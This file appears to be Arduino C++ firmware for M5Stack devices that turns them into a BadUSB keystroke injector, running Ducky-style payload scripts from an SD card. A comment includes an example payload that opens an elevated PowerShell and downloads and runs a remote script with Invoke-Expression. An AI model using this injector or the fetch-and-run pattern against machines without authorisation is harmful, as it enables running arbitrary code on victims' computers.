#ifdef CARDPUTER
#include <USB.h>
#include <SPI.h>
#include <time.h>

// For some reason, StickC and P and P2 dont recognize the following library... may be it need to use EspTinyUSB lib.... need studies
#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;


//#include <BleKeyboard.h>
//BleKeyboard bleKeyboard;
//

#define KEYPAUSE 0xD0
#define KEYNUM_LOCK 0xDB
#define KEYPRINT_SCREEN 0xCE
#define KEYSCROLL_LOCK 0xCF
#define KEYCAPS_LOCK 0xC1
#define KEYMENU 0xED
#define KEYLEFT_CTRL  0x80
#define KEYLEFT_SHIFT 0x81
#define KEYLEFT_ALT   0x82
#define KEYLEFT_GUI   0x83
#define KEYBACKSPACE 0xB2
#define KEYTAB       0xB3
#define KEYENTER     0x28
#define KEYRETURN 0xB0
#define KEYINSERT 0xD1
#define KEYDELETE 0xD4
#define KEYHOME 0xD2
#define KEYEND 0xD5
#define KEYPAGE_UP 0xD3
#define KEYPAGE_DOWN 0xD6
#define KEYUP_ARROW 0xDA
#define KEYDOWN_ARROW 0xD9
#define KEYLEFT_ARROW 0xD8
#define KEYRIGHT_ARROW 0xD7

#define KEYESC 0xB1
#define KEYF1 0xC2
#define KEYF2 0xC3
#define KEYF3 0xC4
#define KEYF4 0xC5
#define KEYF5 0xC6
#define KEYF6 0xC7
#define KEYF7 0xC8
#define KEYF8 0xC9
#define KEYF9 0xCA
#define KEYF10 0xCB
#define KEYF11 0xCC
#define KEYF12 0xCD


#define MAX_FILES 256
#define MAX_FOLDERS 256
#define DEF_DELAY 100
File fileRoot;
File root;
String PreFolder = "/";
String fileList[MAX_FILES];
String folderList[MAX_FOLDERS];

int fileListCount;
int folderListCount;
int startIndex;
int endIndex;
int selectIndex;
bool needRedraw=true;





/* Example of payload file

REM Author: UNC0V3R3D
REM Description: Uses powershell to rotate the monitor by 90 degrees.
REM Version: 1.0
REM Category: FUN
DELAY 800
GUI r
DELAY 800
STRING powershell Start-Process powershell -Verb runAs
DELAY 800
ENTER
DELAY 800
LEFTARROW
DELAY 800
ENTER
DELAY 500
STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UNC0V3R3D/resources/main/monitor_rotation.ps1").Content


*/


void sortList(String fileList[], int fileListCount) {
  bool swapped;
  String temp;
  String name1, name2;
  do {
    swapped = false;
    for (int i = 0; i < fileListCount - 1; i++) {
      name1 = fileList[i];
      name1.toUpperCase();
      name2 = fileList[i + 1];
      name2.toUpperCase();
      if (name1.compareTo(name2) > 0) {
        temp = fileList[i];
        fileList[i] = fileList[i + 1];
        fileList[i + 1] = temp;
        swapped = true;
      }
    }
  } while (swapped);
}


void readFs(String folder) {
  for (int i = 0; i < 255; ++i) {   // Reset all vectors.
    fileList[i] = "";               // Reset all vectors.
    folderList[i] = "";             // Reset all vectors.
  }
  //Read files in folder
  fileRoot = SD.open(folder);

  fileListCount = 0;
  File entry = fileRoot.openNextFile();
  while (entry) {
    if (!entry.isDirectory()) {
      String fullFileName = entry.name();
      String fileName = fullFileName.substring(fullFileName.lastIndexOf("/") + 1);
      String ext = fileName.substring(fileName.lastIndexOf(".") + 1);
      ext.toUpperCase();
      if (ext.equals("TXT") == true) {
        fileList[fileListCount] = fileName;
        fileListCount++;
      }
    }
    entry = fileRoot.openNextFile();
  }
  fileRoot.close();
  //Read folders in folder
  root = SD.open(folder);
  folderListCount = 0;
  File file = root.openNextFile();
  while (file) {
    if (file.isDirectory()) {
      String fullFolderName = file.path();
      String folderName = fullFolderName.substring(fullFolderName.lastIndexOf("/") + 1);
      folderList[folderListCount] = folderName;
      folderListCount++;
    }
    file = root.openNextFile();
  }
  root.close();

  sortList(fileList, fileListCount);
  sortList(folderList, folderListCount);

  startIndex = 0;
  endIndex = startIndex + 8;
  if (endIndex >= (fileListCount + folderListCount)) {
    endIndex = folderListCount + fileListCount - 1;
  }

  needRedraw = true;
  selectIndex = 0;
}



void key_input(String bad_script = "/badpayload.txt")
{
  //The commented commands should be set in the payload file as not all payloads run the same thing
  //Keyboard.press(KEYLEFT_GUI);
  //Keyboard.press('r');
  //Keyboard.releaseAll();
  delay(1000);

 if (SD.exists(bad_script)) {
    File payloadFile = SD.open(bad_script, "r");
    if (payloadFile) {
      DISP.setCursor(0, 40);
      DISP.println("from file!");
      String lineContent = "";
      String Command = "";
      String Argument = "";
      String RepeatTmp = "";
      char ArgChar;
      bool ArgIsCmd; // Verifies if the Argument is DELETE, TAB or F1-F12
      int cmdFail; // Verifies if the command is supported, mus pass through 2 if else statemens and summ 2 to not be supported
      int line; // Shows 3 commands of the payload on screen to follow the execution
      
	    
      Keyboard.releaseAll();
      DISP.setTextSize(1);  
      DISP.setCursor(0, 0); 
      DISP.fillScreen(BLACK); 
      line=0; 
	    
      while (payloadFile.available()) {
        lineContent = payloadFile.readStringUntil('\n');
	ArgIsCmd = false;
	cmdFail = 0;
	RepeatTmp = lineContent.substring(0, lineContent.indexOf(' '));
	RepeatTmp = RepeatTmp.c_str();
	if(RepeatTmp == "REPEAT") {
		if(lineContent.indexOf(' ')>0) {
			RepeatTmp = lineContent.substring(lineContent.indexOf(' ') + 1); // how many times it will repeat, using .toInt() conversion;
			if(RepeatTmp.toInt() == 0) {
				RepeatTmp = "1";
				DISP.setTextColor(RED); DISP.println("REPEAT argument NaN, repeating once");
			}
		} else{
			RepeatTmp = "1";
			DISP.setTextColor(RED); DISP.println("REPEAT without argument, repeating once");
		}
	} else {
		Command = lineContent.substring(0, lineContent.indexOf(' ')); // get the command
		Argument = lineContent.substring(lineContent.indexOf(' ') + 1); // get the argument
		RepeatTmp="1";
	}
	uint16_t i;
	for(i=0; i < RepeatTmp.toInt(); i++) {
		String OldCmd = "";
		Command = Command.c_str();
		Argument = Argument.c_str();
		ArgChar = Argument.charAt(0);
		
		if (Argument=="F1" || Argument=="F2" || Argument=="F3" || Argument=="F4" || Argument=="F5" || Argument=="F6" || Argument=="F7" || Argument=="F8" || Argument=="F9" || Argument=="F10" || Argument=="F11" || Argument=="F2" || Argument == "DELETE" || Argument == "TAB") { ArgIsCmd = true; }
		
		if(Command=="REM") { Serial.println(" // " + Argument); }
	        else if(Command=="DELAY") delay(Argument.toInt());
	        else if(Command=="DEFAULTDELAY" || Command=="DEFAULT_DELAY") delay(DEF_DELAY); //100ms
	        else if(Command=="STRING") Keyboard.print(Argument); 
		else if(Command=="STRINGLN") Keyboard.println(Argument); // I Don't know if it works
	        else if(Command=="ENTER") { Keyboard.press(KEYRETURN); Keyboard.releaseAll(); }
	        else if(Command=="GUI" || Command=="WINDOWS") { Keyboard.press(KEYLEFT_GUI);			 if(!ArgIsCmd) { Keyboard.press(ArgChar); Keyboard.releaseAll(); } else { OldCmd = Command.c_str(); Command = Argument.c_str(); } } // Save Command into OldCmd and then set Command = Argument
	        else if(Command=="SHIFT") { Keyboard.press(KEYLEFT_SHIFT);					 if(!ArgIsCmd) { Keyboard.press(ArgChar); Keyboard.releaseAll(); } else { OldCmd = Command.c_str(); Command = Argument.c_str(); } } // This is made to turn the code faster and to recover
	        else if(Command=="ALT") { Keyboard.press(KEYLEFT_ALT);						 if(!ArgIsCmd) { Keyboard.press(ArgChar); Keyboard.releaseAll(); } else { OldCmd = Command.c_str(); Command = Argument.c_str(); } } // the Command after the if else statements, in order to
	        else if(Command=="CTRL" || Command=="CONTROL") { Keyboard.press(KEYLEFT_CTRL);			 if(!ArgIsCmd) { Keyboard.press(ArgChar); Keyboard.releaseAll(); } else { OldCmd = Command.c_str(); Command = Argument.c_str(); } } // the command REPEAT work as intended.
	        else if(Command=="CTRL-ALT") { Keyboard.press(KEYLEFT_ALT); Keyboard.press(KEYLEFT_CTRL);	 if(!ArgIsCmd) { Keyboard.press(ArgChar); Keyboard.releaseAll(); } else { OldCmd = Command.c_str(); Command = Argument.c_str(); } }
	        else if(Command=="CTRL-SHIFT") { Keyboard.press(KEYLEFT_CTRL); Keyboard.press(KEYLEFT_SHIFT);	 if(!ArgIsCmd) { Keyboard.press(ArgChar); Keyboard.releaseAll(); } else { OldCmd = Command.c_str(); Command = Argument.c_str(); } }
	        else if(Command=="ALT-SHIFT") { Keyboard.press(KEYLEFT_ALT); Keyboard.press(KEYLEFT_SHIFT);	 if(!ArgIsCmd) { Keyboard.press(ArgChar); Keyboard.releaseAll(); } else { OldCmd = Command.c_str(); Command = Argument.c_str(); } }
	        else if(Command=="ALT-GUI") { Keyboard.press(KEYLEFT_ALT); Keyboard.press(KEYLEFT_GUI);		 if(!ArgIsCmd) { Keyboard.press(ArgChar); Keyboard.releaseAll(); } else { OldCmd = Command.c_str(); Command = Argument.c_str(); } }
	        else if(Command=="GUI-SHIFT") { Keyboard.press(KEYLEFT_GUI); Keyboard.press(KEYLEFT_SHIFT);	 if(!ArgIsCmd) { Keyboard.press(ArgChar); Keyboard.releaseAll(); } else { OldCmd = Command.c_str(); Command = Argument.c_str(); } }
	        else if(Command=="DOWNARROW") { Keyboard.press(KEYDOWN_ARROW); Keyboard.releaseAll(); }
	        else if(Command=="DOWN") { Keyboard.press(KEYDOWN_ARROW); Keyboard.releaseAll(); }
	        else if(Command=="LEFTARROW") { Keyboard.press(KEYLEFT_ARROW); Keyboard.releaseAll(); }
	        else if(Command=="LEFT") { Keyboard.press(KEYLEFT_ARROW); Keyboard.releaseAll(); }
	        else if(Command=="RIGHTARROW") { Keyboard.press(KEYRIGHT_ARROW); Keyboard.releaseAll(); }
	        else if(Command=="RIGHT") { Keyboard.press(KEYRIGHT_ARROW); Keyboard.releaseAll(); }
	        else if(Command=="UPARROW") { Keyboard.press(KEYUP_ARROW); Keyboard.releaseAll(); }
	        else if(Command=="UP") { Keyboard.press(KEYUP_ARROW); Keyboard.releaseAll(); }
	        else if(Command=="BREAK") { Keyboard.press(KEYPAUSE); Keyboard.releaseAll(); }
	        else if(Command=="CAPSLOCK")  { Keyboard.press(KEYCAPS_LOCK); Keyboard.releaseAll(); }
	        else if(Command=="PAUSE") { Keyboard.press(KEYPAUSE); Keyboard.releaseAll(); }
	        else if(Command=="BACKSPACE") { Keyboard.press(KEYBACKSPACE); Keyboard.releaseAll(); }
	        else if(Command=="END") { Keyboard.press(KEYEND); Keyboard.releaseAll(); }
	        else if(Command=="ESC" || Command=="ESCAPE") { Keyboard.press(KEYESC); Keyboard.releaseAll(); }
	        else if(Command=="HOME")  { Keyboard.press(KEYHOME); Keyboard.releaseAll(); }
	        else if(Command=="INSERT") { Keyboard.press(KEYINSERT); Keyboard.releaseAll(); }
	        else if(Command=="NUMLOCK") { Keyboard.press(KEYNUM_LOCK); Keyboard.releaseAll(); }
	        else if(Command=="PAGEUP") { Keyboard.press(KEYPAGE_UP); Keyboard.releaseAll(); }
	        else if(Command=="PAGEDOWN") { Keyboard.press(KEYPAGE_DOWN); Keyboard.releaseAll(); }
	        else if(Command=="PRINTSCREEN") { Keyboard.press(KEYPRINT_SCREEN); Keyboard.releaseAll(); }
	        else if(Command=="SCROLLOCK") { Keyboard.press(KEYSCROLL_LOCK); Keyboard.releaseAll(); }
	        else if(Command=="MENU") { Keyboard.press(KEYMENU); Keyboard.releaseAll(); }
		else { cmdFail++; }
	
	        if(Command=="F1") { Keyboard.press(KEYF1); Keyboard.releaseAll(); }
	        else if(Command=="F2") { Keyboard.press(KEYF2); Keyboard.releaseAll(); }
	        else if(Command=="F3") { Keyboard.press(KEYF3); Keyboard.releaseAll(); }
	        else if(Command=="F4") { Keyboard.press(KEYF4); Keyboard.releaseAll(); }
	        else if(Command=="F5") { Keyboard.press(KEYF5); Keyboard.releaseAll(); }
	        else if(Command=="F6") { Keyboard.press(KEYF6); Keyboard.releaseAll(); }
	        else if(Command=="F7") { Keyboard.press(KEYF7); Keyboard.releaseAll(); }
	        else if(Command=="F8") { Keyboard.press(KEYF8); Keyboard.releaseAll(); }
	        else if(Command=="F9") { Keyboard.press(KEYF9); Keyboard.releaseAll(); }
	        else if(Command=="F10") { Keyboard.press(KEYF10); Keyboard.releaseAll(); }
	        else if(Command=="F11") { Keyboard.press(KEYF11); Keyboard.releaseAll(); }
	        else if(Command=="F12") { Keyboard.press(KEYF12); Keyboard.releaseAll(); }
	        else if(Command=="TAB") { Keyboard.press(KEYTAB); Keyboard.releaseAll(); }
		else if(Command=="DELETE") { Keyboard.press(KEYDELETE); Keyboard.releaseAll(); }
		else { cmdFail++; }

		if(ArgIsCmd) Command = OldCmd.c_str(); // Recover the command to run in case of REPEAT
	
	        //else if(Command=="SPACE") Keyboard.press(' '); //Supported on Flipper but not here, yet
	        //else if(Command=="APP") Keyboard.press(APP); //Supported on Flipper but not here, yet
	        //else if(Command=="SYSRQ") Keyboard.press(SYSRQ); //Supported on Flipper but not here, yet
	        Keyboard.releaseAll();
	
	        if(line==7) { DISP.setCursor(0, 0); DISP.fillScreen(BLACK); line=0; }
		line++;
	        if(cmdFail==2) { 
			DISP.setTextColor(RED); 
			DISP.print(Command);DISP.println(" -> Not Supported, running as STRINGLN"); 
			if (Command != Argument) { Keyboard.print(Command); Keyboard.print(" "); Keyboard.println(Argument); }
			else { Keyboard.println(Command); }
		} else { DISP.setTextColor(GREEN); DISP.println(Command); }
	        DISP.setTextColor(WHITE);
	        DISP.println(Argument);
		      
	        if(Command!="REM") delay(DEF_DELAY); //if command is not a comment, wait DEF_DELAY until next command (100ms)
	}
        
      }
      DISP.setTextSize(MEDIUM_TEXT);  
      payloadFile.close();
      Serial.println("Finished badusb payload execution...");
    }
  } else {
    // rick
    Serial.println("rick");
    DISP.setCursor(0, 40);
    DISP.println("rick");
    Keyboard.press(KEYLEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    Keyboard.press(KEYRETURN);
    Keyboard.releaseAll();
  }

  delay(1000);
  Keyboard.releaseAll();

}


void usb_setup()
{
  Serial.println("BadUSB begin");
  DISP.fillScreen(BLACK);
  DISP.setTextColor(WHITE, BGCOLOR);
  DISP.setCursor(0, 0);
  int rot = 3;
  int dispfileCount = 8;
  String bad_script = "";
  bool ClickPwrBtn=false;
  bool ClickSideBtn=false;
  readFs("/");

  while(1) {
	  // DRAW file list ==============================================================================================================
	  if (needRedraw == true) {
	    startIndex = selectIndex - 5;
	    if (startIndex < 0) {
	      startIndex = 0;
	    }
	    endIndex = startIndex + dispfileCount;
	    if (endIndex >= (fileListCount + folderListCount)) {
	      endIndex = fileListCount + folderListCount + 1;
	      if (PreFolder != "/") { endIndex++; }
	      if (selectIndex>6) {
	        startIndex = selectIndex - 6;
	      }
	      else {
	        startIndex = 0;
	      }
	    }
	    if (fileListCount == 0 && folderListCount == 0 && PreFolder == "/") {
	      DISP.fillScreen(BLACK);
	      DISP.setCursor(0, 0);
	      DISP.setTextColor(RED,WHITE);
	      DISP.println("\nSD is empty or there\nare no .txt in root.\nExample: d:\\badpayload.txt");
	      delay(2000);
	      readFs("/");
	    } else {
	      DISP.fillScreen(BLACK);
	      DISP.setCursor(0, 0);
	      for (int index = startIndex; index <= (endIndex + 1); index++) {
	        DISP.setTextColor(WHITE, BLACK); // RESET BG COLOR TO BLACK
	        if (index == selectIndex) {
	          if (index == 0){
	            DISP.setTextColor(BLACK, WHITE);
	            DISP.print(">");
	          } else if (index < folderListCount+1) {
	            DISP.setTextColor(BLUE);  // folders selected in Blue
	            DISP.print(">");
	          } else if (index < (folderListCount + fileListCount+1)){
	            DISP.setTextColor(GREEN);  // files selected in Green
	            DISP.print(">");
	          } else if (index == (folderListCount + fileListCount+1)){
	            if (PreFolder != "/") {
	              DISP.setTextColor(RED, WHITE);  // folders in yellow
	              DISP.print("<");
	            }
	        }
	        } else {
		  if (index == 0){
		    DISP.setTextColor(WHITE);
		    DISP.print(" ");
		  } else if (index < folderListCount+1) {
	            DISP.setTextColor(YELLOW);  // folders in yellow
	            DISP.print(" ");
	          } else if (index < (folderListCount + fileListCount+1)){
	            DISP.setTextColor(WHITE);  // files in white
	            DISP.print(" ");
	          } else if (index == (folderListCount + fileListCount+1)){
	            if (PreFolder != "/") {
	              DISP.setTextColor(RED, BLACK);  // folders in yellow
	              DISP.print(" ");
	            }
	          }
	        }
		if (index==0) {
		  DISP.println(">> Send default    ");
		} else if (index < folderListCount+1) {
	          DISP.println(folderList[index-1].substring(0, 15) + "/");
	        } else if (index < (folderListCount + fileListCount+1)) {
	          DISP.println(fileList[index - folderListCount-1].substring(0, 16));
	        } else if (PreFolder != "/") { 
	          DISP.print("<< back            ");
	          break;
	        } else { break; } 
	      }
	    }
	    needRedraw = false;
	    delay(150);
	  }
	
	  // END of DRAW file list ============================================================================================================
	
	// push Button Detection ==============================================================================================================
	M5.update();
	#if defined(STICK_C_PLUS2)
	  if (digitalRead(M5_BUTTON_MENU) == LOW) ClickPwrBtn = true; // Power Button
	#endif
	#if defined(STICK_C_PLUS) || defined(STICK_C)
	  if (M5.Axp.GetBtnPress()) ClickPwrBtn = true;  // Power Button
	#endif
	#if defined(STICK_C_PLUS) || defined(STICK_C) || defined(STICK_C_PLUS2)
	  if (M5.BtnB.wasPressed())  ClickSideBtn = true; // Side Button
	#endif
	
	
	#if defined(CARDPUTER)
	  M5Cardputer.update();
	  if (M5Cardputer.Keyboard.isKeyPressed('.'))  //Arrow Up
	#else
	  if ((ClickPwrBtn==true && rot==1) || (ClickSideBtn==true && rot==3))
	#endif
	      {
	        selectIndex++;
	        if (selectIndex > (fileListCount + folderListCount + 1) || (selectIndex == (fileListCount + folderListCount + 1) && PreFolder == "/")) {
	        selectIndex = 0;
	        }
	      #ifndef CARDPUTER
	        ClickPwrBtn=false;
	        ClickSideBtn=false;
	      #endif
	        needRedraw = true;
	        delay(100);
	      }
	
	#if defined(CARDPUTER)
	  M5Cardputer.update();
	  if (M5Cardputer.Keyboard.isKeyPressed(';'))        // Arrow Down
	#else
	  if ((ClickPwrBtn==true && rot==3) || (ClickSideBtn==true && rot==1))
	#endif
	  {
	      selectIndex--;
	      if (selectIndex < 0) {
	        selectIndex = fileListCount + folderListCount - 1 + 1;
	        if(PreFolder!="/") {selectIndex++;}
	      }
	    #ifndef CARDPUTER
	      ClickPwrBtn=false;
	      ClickSideBtn=false;
	    #endif
	      needRedraw = true;
	      delay(100);
	  }  
	
	// END of push Button Detection ===========================================================================================================
	  
	// File Selection =========================================================================================================================
	#if defined(STICK_C_PLUS2) || defined(STICK_C_PLUS) || defined(STICK_C)
	  if (M5.BtnA.wasPressed())  // M5 button
	#else
	  M5Cardputer.update();
	  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER))  // Enter
	#endif
	  {
	    if (selectIndex==0) { //when Default is selected
			  DISP.fillScreen(BLACK);
			  #if defined(STICK_C) || defined(STICK_C_PLUS)
			  M5.Axp.ScreenBreath(7);
			  #else
			  DISP.setBrightness(0);
			  #endif
			  bad_script = "/badpayload.txt";
	      break;
	      
	    } else if (selectIndex < (folderListCount +1 )) { //When select a Folder
			  if(PreFolder=="/") { PreFolder = PreFolder + folderList[selectIndex - 1]; }
			  else { PreFolder = PreFolder + "/" + folderList[selectIndex - 1]; }
			  selectIndex=0;
			  readFs(PreFolder);
	
	    } else if (fileList[selectIndex - folderListCount - 1] == "") { // When press Back btn
			  PreFolder = PreFolder.substring(0, PreFolder.lastIndexOf("/"));
			  if(PreFolder == ""){ PreFolder = "/"; }
			  selectIndex=0;
			  readFs(PreFolder);
		
	    } else { // when select a file
	      bad_script = PreFolder + "/" + fileList[selectIndex - folderListCount - 1];
	      break; // Exit while andd start bad USB
	    }
	  }
  }

  DISP.setTextSize(MEDIUM_TEXT);  
  DISP.fillScreen(BLACK);
  DISP.setCursor(0, 0);  
  DISP.println("Sending...");

  Keyboard.begin();
  USB.begin();

  delay(2000);
  key_input(bad_script);
  DISP.setCursor(0, 0);
  DISP.setTextColor(GREEN, BGCOLOR);
  DISP.println("PAYLOAD SENT!");
  DISP.setTextColor(FGCOLOR, BGCOLOR);

}

void usb_loop()
{


}


#ifdef CARDPUTER
/*

Now cardputer works as a USB Keyboard!

Keyboard functions 
Created by: edulk2, thankss

*/

void keyboard_setup() {
    DISP.clear();
    DISP.setRotation(1);
    DISP.setTextColor(GREEN);
    DISP.setTextDatum(middle_center);
    DISP.setTextSize(2);
    DISP.drawString("Keyboard Started",
                                   DISP.width() / 2,
                                   DISP.height() / 2);
    Keyboard.begin();
    USB.begin();
   DISP.setTextColor(FGCOLOR, BGCOLOR);

}

void keyboard_loop() {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
        if (M5Cardputer.Keyboard.isPressed()) {
            Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

            KeyReport report = {0};
            report.modifiers = status.modifiers;
            uint8_t index    = 0;
            for (auto i : status.hid_keys) {
                report.keys[index] = i;
                index++;
                if (index > 5) {
                    index = 5;
                }
            }
            Keyboard.sendReport(&report);
            Keyboard.releaseAll();

            // only text for display
            String keyStr = "";
            for (auto i : status.word) {
                if (keyStr != "") {
                    keyStr = keyStr + "+" + i;
                } else {
                    keyStr += i;
                }
            }

            if (keyStr.length() > 0) {
                DISP.clear();
                DISP.drawString("Pressed: " + keyStr,
                                           DISP.width() / 2,
                                           DISP.height() / 2);

            }

        }
    }
}

#endif
#endif
